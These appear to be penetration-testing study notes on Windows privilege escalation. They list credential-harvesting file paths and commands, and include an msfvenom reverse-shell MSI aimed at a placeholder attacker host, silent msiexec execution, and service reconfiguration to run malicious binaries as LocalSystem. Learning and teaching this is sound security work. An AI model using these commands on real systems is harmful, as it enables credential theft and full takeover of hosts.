---
description: Eighteenth section in Jr Penetration Tester learning path.
---

# Windows Privilege Escalation

### Introduction

Privilege escalation is usually when you are given access to a host with "user A" and leveraging it to access "user B" by abusing weaknesses in the target. Depending on the situation, the following are notable weaknesses:

* Misconfigurations on Windows services/scheduled tasks
* Excessive privileges assigned to account
* Vulnerable software
* Missing Windows Security Patches

Windows systems typically have two types of users: Administrators who can change any system config paramter and access any file in the system & Standard Users who can perform limited tasks, typically cannot change the system and are limited only to their files.

There are also built-in accounts used by the OS:

* SYSTEM/LocalSystem : used by the OS to perform internal tasks, has full access to files and resources. Higher privileged than Administrators.
* Local Service : default account used to run Windows services with "minimum" privileges, uses anonymous connections over the network.
* Network Service : default account used to run Windows services with "minimum" privileges, uses computer credentials to authenticate through the network.

### Password Harvesting - Unattended Installation

When installing Windows on a large number of hosts, Admins may use Windows Deployment Services which allows a single OS image to be deployed to muiltiple hosts on the network. This is referred to as unattanded installation. These installs require admin accounts for initial setup, which can end up being stored in:

* C:\Unattend.xml
* C:\Windows\Panther\Unattend\Unattend.xml
* C:\Windows\system32\sysprep.inf
* C:\Windows\system32\sysprep\sysprep.xml

### Password Harvesting - PowerShell History

Whenever a PowerShell command is run, a history is kept in memory. If a user runs a command using a credential directly as part of the command line it can be retrieved by running the following from `cmd.exe`:

<pre><code><strong>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
</strong></code></pre>

If you wanted to run this from within PowerShell, you would replace `%userprofile%` with `$Env:userprofile`.

### Password Harvesting - Saved Windows Credentials

Windows lets you use other users' credentials, the function also gives the option to save the credentials on the system. Running `cmdkey /list` will show saved credentials. You won't be able to see actual passwords but if you see any worth trying you can use: `runas /savecred /user:admin cmd.exe`.

### Password Harvesting - IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installs. The configuration of websites on IIS is stored in a file called `web.config`. Depending on the IIS version, web.config can be found at:

* C:\inetpub\wwwroot\web.config
* C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

A quick way to find database connection strings in the file is:

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Password Harvesting - Software: PuTTY

PuTTY is an SSH client commonly on Windows systems. Users can store sessions in PuTTY. While it won't let you store an SSH password, it will let you store proxy configurations including cleartext authentication credentials. To retrieve these, you can look in the registry with the following:

```
reg query HKCU:\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

Note that "SimonTatham" is the creator of PuTTY, and the name is part of the registry key path, it should not be replaced with a username.

### Scheduled Tasks

Looking into scheduled tasks may reveal a scheduled task which lost its binary, or is using a modifiable binary. Scheduled tasks can be listed with `schtasks`, and detailed info on a task can be retrieved with `schtasks /query /tn [task_name] /fo list /v`. In the output from this, you are looking for the "Task To Run" and "Run As User" fields. If your current user can modify or overwrite the "Task to Run" then you can replace it with a malicious binary for simple privilege escalation.&#x20;

To check permissions you can run `icacls [file/path]`.

### AlwaysInstallElevated

Windows Installer Files (MSI files) usually run with the privilege level of the user who starts it, however, they can be configured to run with higher privileges from any user account. This method requires two registry values to be set:

* reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
* reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

To exploit this, both need to be set, if both are set then `msfvenom` can be used to generate a malicious `.msi` file:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTKR_IP LPORT=ATTKR_PORT -f msi -o scary.msi
```

Once this file has been transferred, you can execute it with:

```
msiexec /quiet /qn /i C:\Windows\Temp\scary.msi
```

### Windows Services

Windows Services are managed by the SCM (Service Control Manager). Each service has an associated executable which is run by the SCM when a service is started. To check a service's configuration you can run `sc qc [service_name]`.

In here, you can see the associated executable specified by BINARY\_PATH\_NAME and the account used to run the service under SERVICE\_START\_NAME. Services have a Discretionary Access Control List (DACL) which indicates who has control over the services. The DACL can be viewed with Process Hacker. All service configurations are stored in the registry under `HKLM\SYSTEM\CurrentControlSet\Services`. Here the executable is under "ImagePath" and the account used to start the service is under "ObjectName", if a DACL is configured it will be under "Security".

### Insecure Permission on Service Executable

If an executable associated with a service has weak permissions allowing an attacker to modify or replace it, then privilege escalation to the service account can be trivial. If you are able to modify a service executable to replace it with a malicious one you can easily get reverse shells to a target. Assigning permissions can be done with: `icacls [file] /grant Everyone:F`.

### Unquoted Service Paths

In Windows Services, an unusual behaviour exists when a service is pointed to an "unquoted" executable. This means that the path of the associated executable isn't quoted to account for spaces on the command. For example, the executable:

```
BINARY_PATH_NAME : "C:\Program Files\Server Process\Server.exe"
```

This executable is quoted correctly, but the executable:

```
BINARY_PATH_NAME : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

Is not quoted correctly, in the second example, SCM does not know which of the following you want to run:

<table><thead><tr><th width="360">Command</th><th>Argument 1</th><th>Argument 2</th></tr></thead><tbody><tr><td>C:\MyPrograms\Disk.exe</td><td>Sorter</td><td>Enterprise\bin\disksrs.exe</td></tr><tr><td>C:\MyPrograms\Disk Sorter.exe</td><td>Enterprise\bin\disksrs.exe</td><td></td></tr><tr><td>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</td><td></td><td></td></tr></tbody></table>

This is due to how command prompt parses commands. Normally, when a command is sent, spaces are used as argument separators unless they are part of a quoted string, meaning the "correct" interpretation of the unquoted command would be `C:\\MyPrograms\\Disk.exe` and the rest are arguments. Instead of failing (like it should), SCM tries to help by searching for binaries like:

1. Search for `C:\\MyPrograms\\Disk.exe` - if it exists, run the program.
2. If not, search for `C:\\MyPrograms\\Disk Sorter.exe` - if it exists, run the program.
3. If not, search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe` and run it. This option is expected to succeed.

If we recreated any of the executables that SCM is looking for and replaced them with a malicious binary, they would execute before the real command. This is only exploitable where a service is installed in a non-default, writable location.

### Insecure Service Permissions

To check a service DACL from command line, you can use Accesschk from Sysinternals:

```
accesschk64.exe -qlc [service_name]
```

If you are able to see that your user group has SERVICE\_ALL\_ACCESS permission then you can reconfigure the service to point to another executable. This can be done with the following command:

```
sc config [service_name] binPath= "C:\Path\To\Scary.exe" obj= LocalSystem
```

Note that any account can be used to run the service, LocalSystem is just an example. Restarting the service will now execute the new, malicious executable.
